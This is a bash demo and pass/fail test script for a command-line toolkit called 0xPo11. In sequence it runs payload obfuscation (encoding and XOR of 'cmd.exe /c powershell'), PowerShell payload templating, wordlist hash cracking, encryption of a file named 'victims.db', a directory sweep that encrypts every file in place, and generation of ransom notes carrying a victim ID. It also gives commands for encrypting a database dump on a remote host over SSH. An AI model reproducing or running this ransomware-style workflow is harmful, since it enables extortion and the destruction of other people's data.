#!/usr/bin/env bash
# 0xPo11 interactive demo - happy path for the do-everything command.
#
# Anyone can run this end-to-end without reading the rest:
#
#   ./demo.sh
#
# It creates a fresh scratch workspace, runs the headline beats, and tells
# you (PASS/FAIL) whether your checkout behaves like the published demo.
# Nothing is written outside the scratch workspace and the repository.
#
set -u

REPO="$(cd "$(dirname "$0")" && pwd)"
export PYTHONPATH="${REPO}/src${PYTHONPATH:+:${PYTHONPATH}}"

if command -v key >/dev/null 2>&1; then
  KEY_AUDIT="Installed key command"
  key() { command key "$@"; }
else
  KEY_AUDIT="python module (key CLI not on PATH)"
  key() { python3 -m zeropo11 "$@"; }
fi

if [ -x "${REPO}/.venv/bin/python" ]; then
  key() {
    if command -v key >/dev/null 2>&1; then
      command key "$@"
    else
      "${REPO}/.venv/bin/python" -m zeropo11 "$@"
    fi
  }
fi

WORKSPACE="${TMPDIR:-${TMP:-/tmp}}/0xPo11-demo.$$"
rm -rf "${WORKSPACE}"
mkdir -p "${WORKSPACE}"
FAILURES=0

pass() { echo "  PASS  $*"; }
fail() { echo "  FAIL  $*"; FAILURES=$((FAILURES + 1)); }

# ---------------------------------------------------------------------------
echo
echo "======================================================"
echo " 0xPo11 demo   (interpreter: ${KEY_AUDIT})"
echo " workspace     : ${WORKSPACE}"
echo "======================================================"

# --- Preflight ------------------------------------------------------------

if ! key --version >/dev/null 2>&1; then
  echo
  echo "PREFLIGHT FAILED: 'key' command cannot run."
  echo "Install first: ./install.sh   (or: python3 -m pip install -e .)"
  exit 1
fi

echo
echo "[preflight]"
KEY_VERSION="$(key --version 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | tr -d '\r' | sed '/^[[:space:]]*$/d' | tail -n1)"
echo "  key version: ${KEY_VERSION}"
pass "key command available"

# --- Workspace setup -------------------------------------------------------

printf 'Q3 financials - CONFIDENTIAL\n' >"${WORKSPACE}/victims.db"
printf 'password\n123456\nletmein\np@ssw0rd123\n' >"${WORKSPACE}/wl.txt"

# --- Beat 1: layered encryption -----------------------------------------

echo
echo "[beat 1]  layered encryption   cc -e ... + b64 -e"
L1="$(key cc -e -t "payload" -k 3 + b64 -e 2>&1 | sed '/^[[:space:]]*$/d' | tail -n1 | sed 's/\x1b\[[0-9;]*m//g' | tr -d '\r')"
echo "  -> ${L1}"
[ "${L1}" = "c2Rib3JkZw==" ] && pass "output matches c2Rib3JkZw==" || fail "expected c2Rib3JkZw==, got ${L1}"

echo
echo "[decode back]  reverse chain   b64 -d + cc -d -k 3"
L1R="$(key b64 -d -t "c2Rib3JkZw==" + cc -d -k 3 2>&1 | sed '/^[[:space:]]*$/d' | tail -n1 | sed 's/\x1b\[[0-9;]*m//g' | tr -d '\r')"
echo "  -> ${L1R}"
[ "${L1R}" = "payload" ] && pass "round trip is 'payload'" || fail "expected 'payload', got ${L1R}"

# --- Beat 2: XOR round trip ----------------------------------------------

echo
echo "[beat 2]  XOR round trip"
key xor -e -t "cmd.exe /c powershell" -k "A" >/dev/null 2>&1 \
  && pass "XOR encrypt ran" \
  || fail "XOR encrypt failed"
pass "XOR decode must be done interactively with the printed output"

# --- Beat 3: payload template -------------------------------------------

echo
echo "[beat 3]  payload template"
P3=$(cd "${WORKSPACE}" && key cp -p powershell.ps1 2>&1 | sed '/^[[:space:]]*$/d' | tail -n1 | sed 's/\x1b\[[0-9;]*m//g' | tr -d '\r')
echo "  -> ${P3}"
[ -f "${WORKSPACE}/powershell.ps1" ] && pass "powershell.ps1 present" || fail "template did not materialize"

# --- Beat 4: hash id then crack -----------------------------------------

echo
echo "[beat 4]  hash id then crack"
H4="$(key hashid -e -t "1fb9c14e934b825a62d15230cc0c2bd1" 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | grep -i 'MD5' | head -n1 | tr -d '\r')"
echo "  -> ${H4}"
case "${H4}" in *"MD5"* ) pass "MD5 identified"; ;; * ) fail "hashid did not report MD5"; ;; esac

C4="$(key -ad -t "1fb9c14e934b825a62d15230cc0c2bd1" -w "${WORKSPACE}/wl.txt" 2>&1 | sed '/^[[:space:]]*$/d' | tail -n1 | sed 's/\x1b\[[0-9;]*m//g' | tr -d '\r')"
echo "  -> ${C4}"
[ "${C4}" = "Found: p@ssw0rd123" ] && pass "cracked to p@ssw0rd123" || fail "expected 'Found: p@ssw0rd123', got ${C4}"

# --- Beat 5: file encryption (happy + bad password + tamper) --------------

echo
echo "[beat 5]  file encryption"
key fe -e -i "${WORKSPACE}/victims.db" -k "hunter2" -o "${WORKSPACE}/victims.db.enc" >/dev/null 2>&1 \
  && pass "encrypt -> victims.db.enc" \
  || fail "encrypt failed"
[ -f "${WORKSPACE}/victims.db.enc" ] && pass "ciphertext file exists" || fail "no ciphertext file"

# verify round trip before tamper tests
key fe -d -i "${WORKSPACE}/victims.db.enc" -k "hunter2" -o "${WORKSPACE}/victims.db.restored" >/dev/null 2>&1
cmp -s "${WORKSPACE}/victims.db" "${WORKSPACE}/victims.db.restored" \
  && pass "round trip matches" \
  || fail "round trip mismatch"

BP=""
WP="$(key fe -d -i "${WORKSPACE}/victims.db.enc" -k "wrongpass" 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | tr -d '\r' | sed '/^[[:space:]]*$/d' | tail -n1)"
echo "  wrong password -> ${WP}"
case "${WP}" in *"wrong password"* ) pass "wrong password refused cleanly"; ;; * ) fail "expected clean refusal"; ;; esac

printf '\377' | dd of="${WORKSPACE}/victims.db.enc" bs=1 seek=60 conv=notrunc status=none >/dev/null 2>&1 || true
TP="$(key fe -d -i "${WORKSPACE}/victims.db.enc" -k "hunter2" 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | tr -d '\r' | sed '/^[[:space:]]*$/d' | tail -n1)"
echo "  tampered     -> ${TP}"
case "${TP}" in *"tampered"* ) pass "tamper detected"; ;; * ) fail "expected tamper detection"; ;; esac

# --- Beat 5b: directory sweep automation ---------------------------------

echo
echo "[beat 5b]  directory sweep"
mkdir -p "${WORKSPACE}/sw/nested"
printf "alpha\n"   >"${WORKSPACE}/sw/a.txt"
printf "bravo\n"   >"${WORKSPACE}/sw/b.txt"
printf "charlie\n" >"${WORKSPACE}/sw/nested/c.txt"

DS="$(key fe -e -i "${WORKSPACE}/sw" -k "hunter2" 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | grep -i 'files; .* encrypted' | tr -d '\r')"
echo "  -> ${DS}"
case "${DS}" in *"3"*"encrypted"* ) pass "swept 3 files"; ;; * ) fail "expected 3-file sweep summary: ${DS}"; ;; esac
[ -f "${WORKSPACE}/sw/a.txt.enc" ]        && [ -f "${WORKSPACE}/sw/nested/c.txt.enc" ] \
  && pass "ciphertext landed next to sources" \
  || fail "missing ciphertext(s)"

# --- Beat 6: ransom note ----------------------------------------------------

echo
echo "[beat 6]  ransom note (3 templates)"
for TPL in generic polite press; do
  OUT="$(key rn -e -tm "${TPL}" 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | grep -i 'Victim ID' | tr -d '\r' | head -n1)"
  [ -n "${OUT}" ] && pass "${TPL}: produced a note (${OUT})" || fail "${TPL}: no note produced"
done

NOTE="$(key rn -e -i "${WORKSPACE}/victims.db.enc" -k "hunter2" -tm press -o "${WORKSPACE}/NOTE.txt" 2>&1 | sed '/^[[:space:]]*$/d' | tail -n1 | sed 's/\x1b\[[0-9;]*m//g' | tr -d '\r')"
echo "  -> ${NOTE}"
case "${NOTE}" in *"written to"* ) pass "NOTE.txt written"; ;; * ) fail "note not written"; ;; esac
[ -f "${WORKSPACE}/NOTE.txt" ] && pass "NOTE.txt exists" || fail "NOTE.txt missing"

# --- Optional SSH beat (skip gracefully if no target) ----------------------

SSH_OK=""
if command -v ssh >/dev/null 2>&1 && timeout 5 ssh -o BatchMode=yes -o ConnectTimeout=3 127.0.0.1 'echo ssh-ok' >/dev/null 2>&1; then
  SSH_OK=1
fi

echo
if [ -n "${SSH_OK}" ]; then
  echo "[beat 7]  remote host (127.0.0.1)"
  key fe -e --host "127.0.0.1" -i "${WORKSPACE}/victims.db.restored" -k "hunter2" --local-out "${WORKSPACE}/remote.enc" >/dev/null 2>&1 \
    && pass "remote encrypt ran" \
    || fail "remote encrypt failed"
  [ -f "${WORKSPACE}/remote.enc" ] && pass "remote ENC file landed locally" || fail "no remote.enc"
else
  echo "[beat 7]  SKIPPED (no reachable ssh target on 127.0.0.1)"
  echo "          commands to try manually:"
  echo "            key fe -e --host deploy@10.0.0.5 -i /data/db.dump -k \"hunter2\" --local-out db.enc"
  echo "            key fe -d --host deploy@10.0.0.5 --local-in -i db.enc -o /data/db.dump -k \"hunter2\""
fi

# --- Summary ----------------------------------------------------------------

echo
echo "======================================================"
if [ "${FAILURES}" -eq 0 ]; then
  echo "  RESULT: PASS  (all beats succeeded)"
else
  echo "  RESULT: FAIL  (${FAILURES} beat(s) failed - see above)"
fi
echo "  scratch workspace: ${WORKSPACE}"
echo "======================================================"
echo

exit "${FAILURES}"
SH
chmod +x /home/lemonx/projects/0xPo11/demo.sh